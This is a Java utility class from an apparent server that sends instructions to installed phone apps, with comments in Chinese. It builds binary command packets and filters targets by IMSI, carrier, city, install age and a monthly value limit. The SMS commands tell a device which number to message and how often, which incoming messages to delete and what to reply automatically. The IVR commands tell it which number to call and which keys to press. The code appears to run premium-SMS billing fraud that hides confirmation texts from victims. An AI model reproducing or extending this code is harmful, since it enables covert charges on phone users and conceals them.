package com.game.docking.util;

import java.io.UnsupportedEncodingException;
import java.nio.ByteBuffer;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.lang3.StringUtils;
import org.apache.commons.lang3.math.NumberUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.game.docking.ota.entity.SendOtaHeader;
import com.game.docking.ota.entity.VisitOta;
import com.game.ota.entity.OtaCustomer;
import com.game.ota.entity.OtaDevice;
import com.game.util.DateUtils;

public class OtaUtil {
    private static final Logger LOGGER = LoggerFactory.getLogger(OtaUtil.class);
    // ****** 常量 ********
    public static final Integer CITYLEVEL_SC = 2;
    public static final Integer CITYLEVEL_IP = 3;
    public static final Integer CITYLEVEL_NUMBER = 1;
    public static final int LIMIT_LENGTH_IMSI = 6;
    public static final int LIMIT_LENGTH_DEVICEID = 4;
    public static final int LIMIT_LENGTH_CUSTOMERID = 3;
    public static final int PRODUCT_TYPE_ALL = 0;
    public static final int PRODUCT_TYPE_IVR = 1;
    public static final int PRODUCT_TYPE_SMS = 2;
    public static final int PRODUCT_TYPE_WAP = 3;

    // ****** send参数
    public static final byte SEND_HTTP_NULL = 0;
    public static final byte SEND_HTTP_SMS = 1;
    public static final byte SEND_HTTP_IVR = 2;
    public static final byte SEND_HTTP_MASS = 3;
    public static final byte SEND_HTTP_REPORT = 4;
    public static final byte SEND_HTTP_ANSWER = 5;
    public static final byte SEND_HTTP_GAME = 6;
    public static final byte SEND_HTTP_IVR7 = 7;
    public static final String STR_VERTICAL = "|";
    private static final byte BYTE_NULL = 0x0;

    // ****** 监控参数 ********
    public static final int RUNLEVEL_INTERCEPT_CUSTOMER_NULL = 1;
    public static final int RUNLEVEL_INTERCEPT_CUSTOMER_STATUS = 2;
    public static final int RUNLEVEL_INTERCEPT_CUSTOMER_TIME = 3;
    public static final int RUNLEVEL_INTERCEPT_CUSTOMER_CITY = 4;
    public static final int RUNLEVEL_INTERCEPT_CUSTOMER_PROVIDER = 5;
    public static final int RUNLEVEL_INTERCEPT_CUSTOMER_NOIMSI = 6;
    public static final int RUNLEVEL_PASS_CUSTOMER = 19;
    public static final int RUNLEVEL_INTERCEPT_DEVICE_STATUS = 21;
    public static final int RUNLEVEL_INTERCEPT_DEVICE_MVALUE = 22;
    public static final int RUNLEVEL_INTERCEPT_DEVICE_TIMESPAN = 23;
    public static final int RUNLEVEL_PASS_DEVICE = 29;
    public static final int RUNLEVEL_INTERCEPT_PRODUCT_NODATA = 61;
    public static final int RUNLEVEL_INTERCEPT_PRODUCT_NODATA_IVR = 161;
    public static final int RUNLEVEL_INTERCEPT_PRODUCT_NODATA_SMS = 261;
    public static final int RUNLEVEL_PASS_SUCCESS = 1009;
    public static final int RUNLEVEL_PASS_SUCCESS_IVR = 1109;
    public static final int RUNLEVEL_PASS_SUCCESS_SMS = 1209;

    /**
     * 空访问数据返回
     */
    public static ByteBuffer generateOtaDatasNull(SendOtaHeader otaHeader) {
        ByteBuffer result = ByteBuffer.allocate(4 + 4 + 4 + 1);
        // checksum是效验值，来判断本次接收的内容是否正确，4个字节
        ByteBuffer checksumBuffer = ByteBuffer.allocate(4);
        checksumBuffer.put(otaHeader.getChecksum().getBytes());
        result.put(checksumBuffer);
        // seed是加密的密钥，4个字节
        ByteBuffer seedBuffer = ByteBuffer.allocate(4);
        seedBuffer.put(otaHeader.getSeed().getBytes());
        result.put(seedBuffer);
        // 下次访问时间：用4个字节表示，如：24,表示24小时候再次访问服务器
        result.putInt(Integer.reverseBytes(otaHeader.getInterval()));
        // 类型
        result.put(otaHeader.getSendtype());
        return result;
    }

    /**
     * 数据返回：短信1 checksum&seed&下次访问时间&1&通道号码&指令&次数&发送间隔&下行屏蔽关键字&屏蔽号码头&回复类型&回复关键字
     */
    public static ByteBuffer generateOtaDatasSmsTest(SendOtaHeader otaHeader, String moNumber, String moContent, byte degree, byte betInterval, String deleteKeyWord,
            String deleteKeyNumber, byte replyType, String replyContent) {
        int moNumberLength = moNumber.length() + 1;
        int moContentLength = moContent.length() + 1;
        int deleteKeyWordLength = deleteKeyWord.length() * 2 + 2;
        int deleteKeyNumberLength = deleteKeyNumber.length() + 1;
        int replyContentLength = replyContent.length() * 2 + 2;
        ByteBuffer result = ByteBuffer.allocate(4 + 4 + 4 + 1 + moNumberLength + moContentLength + 1 + 1 + deleteKeyWordLength + deleteKeyNumberLength + 1 + replyContentLength);
        // checksum是效验值，来判断本次接收的内容是否正确，4个字节
        ByteBuffer checksumBuffer = ByteBuffer.allocate(4);
        checksumBuffer.put(otaHeader.getChecksum().getBytes());
        result.put(checksumBuffer);
        // seed是加密的密钥，4个字节
        ByteBuffer seedBuffer = ByteBuffer.allocate(4);
        seedBuffer.put(otaHeader.getSeed().getBytes());
        result.put(seedBuffer);
        // 下次访问时间：用4个字节表示，如：24,表示24小时候再次访问服务器
        result.putInt(Integer.reverseBytes(otaHeader.getInterval()));
        // 类型
        result.put(otaHeader.getSendtype());
        // 通道号码：用ASCII编码，用0x0做结束符
        result.put(moNumber.getBytes()).put(BYTE_NULL);
        // 指令：用ASCII编码，用0x0做结束符
        result.put(moContent.getBytes()).put(BYTE_NULL);
        // 次数：占1个字节
        result.put(degree);
        // 发送间隔：占1字节，以分钟为单位
        result.put(betInterval);
        // 下行屏蔽关键字：用unicode格式，多个关键字用|分隔，不限个数，用0x0,0x0（2个null）做结束符（如果没有，用unicode的“|”表示）
        try {
            result.put(deleteKeyWord.getBytes("UnicodeLittleUnmarked")).put(BYTE_NULL).put(BYTE_NULL);
        } catch (UnsupportedEncodingException e) {
            LOGGER.error("屏蔽关键字转GBK编码异常{}", e);
        }
        // 屏蔽号码头：用ASCII编码，多个以|做分割，不限个数,以0x0,做结束符,如果没有，用ascII的“|”表示
        result.put(deleteKeyNumber.getBytes()).put(BYTE_NULL);
        // 回复类型:占1字节，用来指定是哪种回复方式（0随机 1答题 2截取）
        result.put(replyType);
        // 回复关键字：用unicode格式，多个关键字用|分隔，不限个数，用0x0,0x0（2个null）做结束符
        try {
            result.put(replyContent.getBytes("UnicodeLittleUnmarked")).put(BYTE_NULL).put(BYTE_NULL);
        } catch (UnsupportedEncodingException e) {
            LOGGER.error("回复关键字转GBK编码异常{}", e);
        }
        return result;
    }

    /**
     * 数据返回：短信1 checksum&seed&下次访问时间&1&通道号码&指令&次数&发送间隔&下行屏蔽关键字&屏蔽号码头&回复类型&回复关键字
     */
    public static ByteBuffer generateOtaDatasSms(SendOtaHeader otaHeader, String moNumber, String moContent, byte degree, byte betInterval, String deleteKeyWord,
            String deleteKeyNumber, byte replyType, String replyContent) {
        int moNumberLength = moNumber.length() + 1;
        int moContentLength = moContent.length() + 1;
        int deleteKeyWordLength = 2;
        try {
            deleteKeyWordLength = deleteKeyWord.getBytes("UnicodeLittleUnmarked").length + 2;
        } catch (UnsupportedEncodingException e1) {
            // TODO Auto-generated catch block
            e1.printStackTrace();
        }
        int deleteKeyNumberLength = deleteKeyNumber.length() + 1;
        int replyContentLength = 2;
        try {
            replyContentLength = replyContent.getBytes("UnicodeLittleUnmarked").length + 2;
        } catch (UnsupportedEncodingException e1) {
            // TODO Auto-generated catch block
            e1.printStackTrace();
        }
        ByteBuffer result = ByteBuffer.allocate(4 + 4 + 4 + 1 + moNumberLength + moContentLength + 1 + 1 + deleteKeyWordLength + deleteKeyNumberLength + 1 + replyContentLength);
        // checksum是效验值，来判断本次接收的内容是否正确，4个字节
        ByteBuffer checksumBuffer = ByteBuffer.allocate(4);
        checksumBuffer.put(otaHeader.getChecksum().getBytes());
        result.put(checksumBuffer);
        // seed是加密的密钥，4个字节
        ByteBuffer seedBuffer = ByteBuffer.allocate(4);
        seedBuffer.put(otaHeader.getSeed().getBytes());
        result.put(seedBuffer);
        // 下次访问时间：用4个字节表示，如：24,表示24小时候再次访问服务器
        result.putInt(Integer.reverseBytes(otaHeader.getInterval()));
        // 类型
        result.put(otaHeader.getSendtype());
        // 通道号码：用ASCII编码，用0x0做结束符
        result.put(moNumber.getBytes()).put(BYTE_NULL);
        // 指令：用ASCII编码，用0x0做结束符
        result.put(moContent.getBytes()).put(BYTE_NULL);
        // 次数：占1个字节
        result.put(degree);
        // 发送间隔：占1字节，以分钟为单位
        result.put(betInterval);
        // 下行屏蔽关键字：用unicode格式，多个关键字用|分隔，不限个数，用0x0,0x0（2个null）做结束符（如果没有，用unicode的“|”表示）
        try {
            result.put(deleteKeyWord.getBytes("UnicodeLittleUnmarked")).put(BYTE_NULL).put(BYTE_NULL);
        } catch (UnsupportedEncodingException e) {
            LOGGER.error("屏蔽关键字转unicode编码异常{}", e);
        }
        // 屏蔽号码头：用ASCII编码，多个以|做分割，不限个数,以0x0,做结束符,如果没有，用ascII的“|”表示
        result.put(deleteKeyNumber.getBytes()).put(BYTE_NULL);
        // 回复类型:占1字节，用来指定是哪种回复方式（0随机 1答题 2截取）
        result.put(replyType);
        // 回复关键字：用unicode格式，多个关键字用|分隔，不限个数，用0x0,0x0（2个null）做结束符
        try {
            result.put(replyContent.getBytes("UnicodeLittleUnmarked")).put(BYTE_NULL).put(BYTE_NULL);
        } catch (UnsupportedEncodingException e) {
            LOGGER.error("回复关键字转unicode编码异常{}", e);
        }
        return result;
    }

    /**
     * 数据返回：ivr7 checksum&seed&下次访问时间&7&电话号码&拨打时间&错误尝试次数&下行屏蔽关键字&屏蔽号码头&按键信息
     */
    public static ByteBuffer generateOtaDatasIvr(SendOtaHeader otaHeader, String moNumber, int callTime, byte degree, String deleteKeyWord, String deleteKeyNumber,
            String keyContent) {
        int moNumberLength = moNumber.length() + 1;
        int deleteKeyWordLength = deleteKeyWord.length() * 2 + 2;
        int deleteKeyNumberLength = deleteKeyNumber.length() + 1;
        int keyContentLength = keyContent.length() + 1;
        ByteBuffer result = ByteBuffer.allocate(4 + 4 + 4 + 1 + moNumberLength + 4 + 1 + deleteKeyWordLength + deleteKeyNumberLength + keyContentLength);
        // checksum是效验值，来判断本次接收的内容是否正确，4个字节
        ByteBuffer checksumBuffer = ByteBuffer.allocate(4);
        checksumBuffer.put(otaHeader.getChecksum().getBytes());
        result.put(checksumBuffer);
        // seed是加密的密钥，4个字节
        ByteBuffer seedBuffer = ByteBuffer.allocate(4);
        seedBuffer.put(otaHeader.getSeed().getBytes());
        result.put(seedBuffer);
        // 下次访问时间：用4个字节表示，如：24,表示24小时候再次访问服务器
        result.putInt(Integer.reverseBytes(otaHeader.getInterval()));
        // 类型
        result.put(otaHeader.getSendtype());
        // 通道号码：用ASCII编码，用0x0做结束符
        result.put(moNumber.getBytes()).put(BYTE_NULL);
        // 拨打时间：unsigned int，占4个字节，以秒为单位
        result.putInt(Integer.reverseBytes(callTime));
        // 错误尝试次数：占1个字节(0-10之间，如果不是客户端默认3次)
        result.put(degree);
        // 下行屏蔽关键字：用unicode格式，多个关键字用|分隔，不限个数，用0x0,0x0（2个null）做结束符（如果没有，用unicode的“|”表示）
        try {
            result.put(deleteKeyWord.getBytes("UnicodeLittleUnmarked")).put(BYTE_NULL).put(BYTE_NULL);
        } catch (UnsupportedEncodingException e) {
            LOGGER.error("屏蔽关键字转unicode编码异常{}", e);
        }
        // 屏蔽号码头：用ASCII编码，多个以|做分割，不限个数,以0x0,做结束符,如果没有，用ascII的“|”表示
        result.put(deleteKeyNumber.getBytes()).put(BYTE_NULL);
        // 按键信息：用ASCII编码，用0x0做结束符。格式为：接通后等待时间,按键值|第二组按键等待时间,第二组按键|….
        result.put(keyContent.getBytes()).put(BYTE_NULL);
        return result;
    }

    /**
     * 获取IMSI和SC对
     */
    public static Map<String, String> getImsiSc(VisitOta visit) {
        Map<String, String> map = new HashMap<String, String>();
        if (visit != null) {
            if (StringUtils.isNotBlank(visit.getImsi()) && visit.getImsi().length() > LIMIT_LENGTH_IMSI) {
                map.put("imsi", visit.getImsi());
                map.put("sc", visit.getSc());
            } else if (StringUtils.isNotBlank(visit.getImsi1()) && visit.getImsi1().length() > LIMIT_LENGTH_IMSI) {
                map.put("imsi", visit.getImsi1());
                map.put("sc", visit.getSc1());
            } else if (StringUtils.isNotBlank(visit.getImsi2()) && visit.getImsi2().length() > LIMIT_LENGTH_IMSI) {
                map.put("imsi", visit.getImsi2());
                map.put("sc", visit.getSc2());
            } else if (StringUtils.isNotBlank(visit.getImsi3()) && visit.getImsi3().length() > LIMIT_LENGTH_IMSI) {
                map.put("imsi", visit.getImsi3());
                map.put("sc", visit.getSc3());
            } else if (StringUtils.isNotBlank(visit.getImsi4()) && visit.getImsi4().length() > LIMIT_LENGTH_IMSI) {
                map.put("imsi", visit.getImsi4());
                map.put("sc", visit.getSc4());
            }
        }
        return map;
    }

    /**
     * 客户过滤
     */
    public static int passCustomer(OtaCustomer customer, String currentTime, String imsi, Long cityid, int provider) {
        if (customer == null) {
            return RUNLEVEL_INTERCEPT_CUSTOMER_NULL;
        }
        if (!NumberUtils.INTEGER_ONE.equals(customer.getStatus())) {
            return RUNLEVEL_INTERCEPT_CUSTOMER_STATUS;
        }
        if (!DateUtils.betweenTime(customer.getBegintime(), customer.getEndtime(), currentTime, "HH:mm:ss")) {
            return RUNLEVEL_INTERCEPT_CUSTOMER_TIME;
        }
        if (StringUtils.isBlank(imsi)) {
            return RUNLEVEL_INTERCEPT_CUSTOMER_NOIMSI;
        } else {
            if (provider == 0) {
                return RUNLEVEL_INTERCEPT_CUSTOMER_PROVIDER;
            } else {
                if (!NumberUtils.INTEGER_ZERO.equals(customer.getProvider()) && customer.getProvider() != provider) {
                    return RUNLEVEL_INTERCEPT_CUSTOMER_PROVIDER;
                }
            }
        }
        if (cityid == null || NumberUtils.LONG_ZERO.equals(cityid)) {
            return RUNLEVEL_INTERCEPT_CUSTOMER_CITY;
        } else {
            String cityStr = "|" + cityid + "|";
            if (StringUtils.isBlank(customer.getCitys()) || !customer.getCitys().contains(cityStr)) {
                return RUNLEVEL_INTERCEPT_CUSTOMER_CITY;
            }
        }
        return RUNLEVEL_PASS_CUSTOMER;
    }

    /**
     * 设备信息过滤
     */
    public static int passDevice(OtaDevice device, int daybetw, int cApkdays, boolean isLastpadvInMonth, int restValue) {
        // if (NumberUtils.INTEGER_ZERO.equals(device.getBlack()) || NumberUtils.INTEGER_ZERO.equals(device.getStatus())) {
        // return RUNLEVEL_INTERCEPT_DEVICE_STATUS;
        // }
        if (isLastpadvInMonth && restValue <= 0) {
            return RUNLEVEL_INTERCEPT_DEVICE_MVALUE;
        }
        if (daybetw < cApkdays) {
            return RUNLEVEL_INTERCEPT_DEVICE_TIMESPAN;
        }
        return RUNLEVEL_PASS_DEVICE;
    }

    public static void printHexString(byte[] b) {
        for (int i = 0; i < b.length; i++) {
            String hex = Integer.toHexString(b[i] & 0xFF);
            if (hex.length() == 1) {
                hex = '0' + hex;
            }
            System.out.print(hex.toUpperCase() + " ");
        }
    }

}
